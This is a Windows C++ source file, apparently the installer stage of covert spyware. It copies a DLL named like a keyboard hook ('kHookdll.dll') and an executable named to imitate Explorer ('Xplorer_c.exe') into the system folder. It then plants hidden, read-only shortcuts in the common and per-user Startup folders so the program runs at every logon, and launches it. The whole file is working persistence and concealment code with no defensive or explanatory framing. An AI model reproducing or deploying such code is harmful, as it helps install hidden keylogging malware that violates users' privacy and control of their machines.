// InstService.cpp : Defines the entry point for the application.
//

#define _WIN32_WINNT 0x0500
#define _WIN32_IE 0x0500
#include "stdafx.h"
#include <Shlobj.h>
#include <shellapi.h>
#include <tchar.h>

#define CSIDL_SYSTEM 0x0025



int APIENTRY wWinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{

	//installing in startup
	TCHAR	szPath[MAX_PATH],szStartupPath[MAX_PATH];
	TCHAR	szFilePath[MAX_PATH];


	if(SHGetSpecialFolderPath(NULL,szPath,CSIDL_SYSTEM,0))
	{
		//move files
		_tcscpy(szFilePath,szPath);
		_tcscat(szFilePath,_T("\\kHookdll.dll"));
		MoveFile(_T("kHookdll.dll"),szFilePath);

		_tcscpy(szFilePath,szPath);
		_tcscat(szFilePath,_T("\\Xplorer_c.exe"));
		MoveFile(_T("Xplorer_c.exe"),szFilePath);

		
		//create shortcut in startup
		CoInitialize(NULL);
		IShellLink* psl;             
		HRESULT  hres = CoCreateInstance(CLSID_ShellLink, NULL, 
				CLSCTX_INPROC_SERVER, IID_IShellLink, (LPVOID *) &psl); 
		if (SUCCEEDED(hres)) 
		{ 
			IPersistFile* ppf; 
			psl->SetPath(szFilePath);
			hres = psl->QueryInterface(IID_IPersistFile,(LPVOID*)&ppf); 
			if (SUCCEEDED(hres)) 
			{    
				//make link in startup(common & current user)
				//hide the link then
				SHGetSpecialFolderPath(NULL,szStartupPath,CSIDL_COMMON_STARTUP,0);
				_tcscat(szStartupPath,_T("\\Xplorer_c.lnk"));
				hres = ppf->Save(szStartupPath, TRUE); 
				SetFileAttributes(szStartupPath,FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY);

				SHGetSpecialFolderPath(NULL,szStartupPath,CSIDL_STARTUP,0);
				_tcscat(szStartupPath,_T("\\Xplorer_c.lnk"));
				hres = ppf->Save(szStartupPath, TRUE); 
				SetFileAttributes(szStartupPath,FILE_ATTRIBUTE_READONLY);

				ppf->Release(); 
			} 
			psl->Release(); 
		}

		CoUninitialize();
	}

	//execute
	ShellExecute(NULL,_T("open"),szStartupPath,NULL,NULL,SW_SHOWNORMAL);


	return 0;
}



